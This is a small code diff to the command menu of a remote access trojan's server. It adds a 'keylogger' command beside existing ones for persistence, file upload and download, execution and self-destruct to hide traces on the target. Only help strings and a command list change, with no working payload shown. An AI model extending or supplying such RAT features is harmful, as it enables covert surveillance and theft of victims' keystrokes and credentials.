@@ -42,10 +42,11 @@ selfdestruct        - Remove all traces of the RAT from the target system.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <file>       - Upload a file.
-wget <url>          - Download a file from the web.'''
+wget <url>          - Download a file from the web.
+keylogger          - Active keylogger on the target.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
              'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
-             'unzip', 'upload', 'wget' ]
+             'unzip', 'upload', 'wget','keylogger' ]
 
 
 class Server(threading.Thread):
